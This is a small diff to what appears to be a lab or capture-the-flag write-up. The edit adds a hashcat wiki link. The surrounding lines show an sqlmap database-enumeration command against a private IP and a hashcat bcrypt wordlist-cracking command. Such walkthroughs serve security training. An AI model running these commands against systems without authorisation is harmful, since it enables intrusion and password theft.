@@ -176,7 +176,7 @@ sqlmap -u "http://10.201.65.171/products/1" --dbs
 
 ### 2. Password Hash Cracking
 
-Used hashcat to crack bcrypt hashes:
+Used hashcat to crack [bcrypt](https://hashcat.net/wiki/doku.php?id=example_hashes) hashes:
 
 ```bash
 hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
